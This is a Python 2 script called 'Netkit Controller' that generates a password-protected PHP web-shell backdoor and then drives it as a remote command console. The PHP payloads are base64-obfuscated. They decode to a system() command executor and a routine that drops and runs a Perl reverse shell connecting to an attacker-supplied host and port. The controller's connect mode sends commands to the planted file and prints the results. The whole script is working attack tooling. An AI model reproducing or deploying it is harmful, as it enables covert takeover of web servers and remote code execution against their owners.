#!/usr/bin/python
import time,base64,urllib2,os,urllib,sys,readline
from Crypto.Hash import MD5
h = MD5.new()
reverse = "aWYoaXNzZXQoJF9QT1NUWyJyaG9zdCJdKSkgew0KJHJob3N0ID0gJF9QT1NUWyJyaG9zdCJdOw0KJHJwb3J0ID0gJF9QT1NUWyJycG9ydCJdOw0KJGYgPSBmb3BlbigicmV2ZXJzZS5wbCIsICJ3Iik7DQpmd3JpdGUoJGYsICd1c2UgU29ja2V0OyRpPSInLiRyaG9zdC4nIjskcD0nLiRycG9ydC4nO3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9OycpOw0KZXhlYygicGVybCByZXZlcnNlLnBsIik7DQp9"
revers = base64.b64decode(reverse)
phpcoder = 'JGEgPSAnJHBhc3N3b3JkID0gJF9QT1NUWyJwYXNzIl07JzsNCiRiID0gJyRwYXNzd29yZCA9IG1kNSgkcGFzc3dvcmQpOyc7DQokYyA9ICckY21kID0gJF9QT1NUWyJjbWQiXTsnOw0KJGQgPSAnJGRlbGJhY2sgPSAkX1BPU1RbImRlbHNlbGYiXTsgaWYoaXNzZXQoJHBhc3N3b3JkKSl7IGlmKCRwYXNzID09ICRwYXNzd29yZCkgeyBpZihpc3NldCgkY21kKSl7IHN5c3RlbSgkY21kKTsgfSB9ZWxzZXsgcHJpbnQgIlBhc3N3b3JkIjsgfSB9JzsNCmV2YWwoJGEuJGIuJGMuJGQpOyANCg=='
phpcoder = base64.b64decode(phpcoder)
reverselist = ["php/reverse_shell","perl/reverse_shell","bash/reverse_shell"]
msfip = ""
msfport = ""
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
kare = "#                                                                            #"
kena = "##############################################################################"
logo = "#                              Netkit Controller                             #"
print kena
a = 1
while a < 5:
    print kare
    time.sleep(0.1)
    if(a == 2):
        print logo.center(40,"#")
    a = a + 1
print kena
connect = 0
if len(sys.argv) == 4:
    if sys.argv[1] != "":
	if sys.argv != "--help":
	    sta = sys.argv[1] #Generate or connect
    if sys.argv[2] != "":
	sta2 = sys.argv[2] #Backdoor filename or http
    if sys.argv[3] != "":
        sta3 = sys.argv[3] #Password
        h.update(bytearray(sta3))
        mdpassword = h.hexdigest()
	if sta == "--generate":
	    fqx = open(sta2, "w")

	    fqx.write('<?php '+revers+'error_reporting(0); $pass = "'+mdpassword+'"; '+phpcoder+' ?>')
	    print "Netkit Backdoor File created in "+os.getcwd()+"/"+sta2
	elif sta == "--connect":
	    if sta2 == "" or sta3 == "":
		print bcolors.FAIL + "You must write url and password value" + bcolors.ENDC
	    try:
		urllib2.urlopen(sta2)
		data = urllib.urlencode({'pass'  : sta3})
		req = urllib2.Request(sta2, data)
		response = urllib2.urlopen(req)
		if response.read() == "Password":
		    print bcolors.FAIL + "Password is not True !" + bcolors.ENDC
		else:
		    cmd = "uname -a"
		    urllib2.urlopen(sta2)
		    data = urllib.urlencode({'cmd' : cmd, 'pass'  : sta3})
		    req = urllib2.Request(sta2, data)
		    response = urllib2.urlopen(req)
		    uname = response.read()
	            uname = uname.replace("\n","")
		    cmd2 = "whoami"
		    urllib2.urlopen(sta2)
		    data2 = urllib.urlencode({'cmd' : cmd2, 'pass'  : sta3})
		    req2 = urllib2.Request(sta2, data2)
		    response2 = urllib2.urlopen(req2)
		    who = response2.read()
		    who = who.replace("\n","")
		    cmd2 = "pwd"
		    urllib2.urlopen(sta2)
		    data2 = urllib.urlencode({'cmd' : cmd2, 'pass'  : sta3})
		    req2 = urllib2.Request(sta2, data2)
		    response2 = urllib2.urlopen(req2)
		    pat = response2.read()
		    pat = pat.replace("\n","")
		    print "###################\n"
		    print bcolors.BOLD + "[+] Target : " + bcolors.ENDC+sta2
		    print bcolors.BOLD + "[+] Server : " + bcolors.ENDC+uname
		    print bcolors.BOLD + "[+] Whoami : " + bcolors.ENDC+who
		    print "###################"
		    while True:
			cmd2 = "pwd"
		    	urllib2.urlopen(sta2)
			data2 = urllib.urlencode({'pt' : "1", 'pass'  : sta3})
			req2 = urllib2.Request(sta2, data2)
			response2 = urllib2.urlopen(req2)
			pat = response2.read()
			pat = pat.replace("\n","")
			rcmd = raw_input(bcolors.BOLD+bcolors.FAIL+who+"@ "+pat+"> " +bcolors.ENDC)
			cd = rcmd[0] + rcmd[1]
			if rcmd == "exit": #Exit Control Panel
			    break
			elif rcmd == "clear": # Clear Terminal
			    os.system("clear")
			elif rcmd == "generate reverse_shell":
				rhost = raw_input("RHOST : ")
				rport = raw_input("RPORT : ")
				urllib2.urlopen(sta2)
				data = urllib.urlencode({'rhost' : rhost, 'rport': rport, 'pass'  : sta3})
				req = urllib2.Request(sta2, data)
				response = urllib2.urlopen(req)
				print response.read()
					
			elif rcmd == "help": # Help Menu
			    print bcolors.BOLD + """
			    netkit generate backdoor.php abc123
			    netkit connect http://localhost/backdoor.php abc123
			    generate : For a generate backdoor
			    connect : For a connect backdoor"""	 + bcolors.ENDC
			elif cd == "cd":
			    rcmd = rcmd.replace("cd ","")
			    pathx = rcmd
			elif rcmd != "": # CMD command
			    urllib2.urlopen(sta2)
			    data = urllib.urlencode({'path': pathx,'cmd' : rcmd, 'pass'  : sta3})
			    req = urllib2.Request(sta2, data)
			    response = urllib2.urlopen(req)
			    print response.read()

	    except urllib2.HTTPError as err:
		if err.code == 404:
		    print "File Not Found" # File Not Found
		else:
		    raise
elif len(sys.argv) == 2:
    if sys.argv[1] == "--help": # Help Menu NO Connected
	print bcolors.BOLD + """
python netkit.py --generate <filename> <password>
python netkit.py --connect <url> <password>
python netkit.py --help
""" + bcolors.ENDC
else:
    print bcolors.BOLD + bcolors.FAIL + "You entered the missing parameter , If you want help : --help" + bcolors.ENDC
